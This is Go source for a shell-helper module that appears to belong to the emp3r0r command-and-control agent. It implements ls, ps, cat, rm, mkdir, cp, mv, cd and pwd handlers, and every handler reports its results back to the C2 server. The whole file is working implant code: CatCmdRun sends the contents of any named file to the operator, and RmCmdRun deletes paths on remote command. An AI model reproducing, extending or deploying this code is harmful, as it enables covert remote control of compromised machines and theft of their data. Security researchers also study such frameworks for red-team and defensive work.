package shellhelper

import (
	"os"
	"path/filepath"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

func LsCmdRun(cmd *cobra.Command, args []string) {
	// Lists the contents of the specified directory.
	target_dir, err := cmd.Flags().GetString("dst")
	if err != nil {
		c2transport.NotifyC2(cmd, "args error: %v", err)
		return
	}
	out, err := util.LsPath(target_dir)
	if err != nil {
		out = err.Error()
	}

	c2transport.NotifyC2(cmd, "%s", out)
}

func PsCmdRun(cmd *cobra.Command, args []string) {
	// Lists all running processes.
	pid, _ := cmd.Flags().GetInt("pid")
	name, _ := cmd.Flags().GetString("name")
	user, _ := cmd.Flags().GetString("user")
	cmdLine, _ := cmd.Flags().GetString("cmdline")
	out, err := CmdPS(pid, user, name, cmdLine)
	if err != nil {
		c2transport.NotifyC2(cmd, "Failed to ps: %v", err)
		return
	}
	c2transport.NotifyC2(cmd, "%s", out)
}

// CatCmdRun reads and sends the contents of the specified file.
func CatCmdRun(cmd *cobra.Command, args []string) {
	targetFile, _ := cmd.Flags().GetString("dst")
	if targetFile == "" {
		c2transport.NotifyC2(cmd, "error: no file specified")
		return
	}
	out, err := util.DumpFile(targetFile)
	if err != nil {
		c2transport.NotifyC2(cmd, "%v", err)
		return
	}
	c2transport.NotifyC2(cmd, "%s", out)
}

// RmCmdRun deletes the specified file or directory.
func RmCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		c2transport.NotifyC2(cmd, "args error: %v", args)
		return
	}
	if err := util.RemoveFileAgent(path); err != nil {
		c2transport.NotifyC2(cmd, "Failed to delete %s: %v", path, err)
		return
	}
	c2transport.NotifyC2(cmd, "Deleted %s", path)
}

// MkdirCmdRun creates a directory with mode 0700.
func MkdirCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		c2transport.NotifyC2(cmd, "args error: %v", args)
		return
	}
	if err := os.MkdirAll(path, 0700); err != nil {
		c2transport.NotifyC2(cmd, "Failed to mkdir %s: %v", path, err)
		return
	}
	c2transport.NotifyC2(cmd, "Mkdir %s", path)
}

// CpCmdRun copies a file or directory from source to destination.
func CpCmdRun(cmd *cobra.Command, args []string) {
	src, _ := cmd.Flags().GetString("src")
	dst, _ := cmd.Flags().GetString("dst")
	if src == "" || dst == "" {
		c2transport.NotifyC2(cmd, "args error: %v", args)
		return
	}
	if err := util.CopyAgent(src, dst); err != nil {
		c2transport.NotifyC2(cmd, "Failed to copy %s to %s: %v", src, dst, err)
		return
	}
	c2transport.NotifyC2(cmd, "%s has been copied to %s", src, dst)
}

// MvCmdRun moves a file or directory from source to destination.
func MvCmdRun(cmd *cobra.Command, args []string) {
	src, _ := cmd.Flags().GetString("src")
	dst, _ := cmd.Flags().GetString("dst")
	if src == "" || dst == "" {
		c2transport.NotifyC2(cmd, "args error: %v", args)
		return
	}
	if err := util.CopyAgent(src, dst); err != nil {
		c2transport.NotifyC2(cmd, "Failed to move (copy) %s to %s: %v", src, dst, err)
		return
	}
	if err := util.RemoveFileAgent(src); err != nil {
		c2transport.NotifyC2(cmd, "Failed to move (rm) %s: %v", src, err)
		return
	}
	c2transport.NotifyC2(cmd, "%s has been moved to %s", src, dst)
}

// CdCmdRun changes the working directory.
func CdCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		c2transport.NotifyC2(cmd, "args error: %v", args)
		return
	}
	cdPath, err := filepath.Abs(path)
	if err != nil {
		c2transport.NotifyC2(cmd, "cd error: %v", err)
		return
	}
	if err = os.Chdir(cdPath); err != nil {
		c2transport.NotifyC2(cmd, "cd error: %v", err)
		return
	}
	c2transport.NotifyC2(cmd, "%s", cdPath)
}

// PwdCmdRun prints the current working directory.
func PwdCmdRun(cmd *cobra.Command, args []string) {
	pwd, err := os.Getwd()
	if err != nil {
		c2transport.NotifyC2(cmd, "pwd error: %v", err)
		return
	}
	c2transport.NotifyC2(cmd, "current working directory: %s", pwd)
}
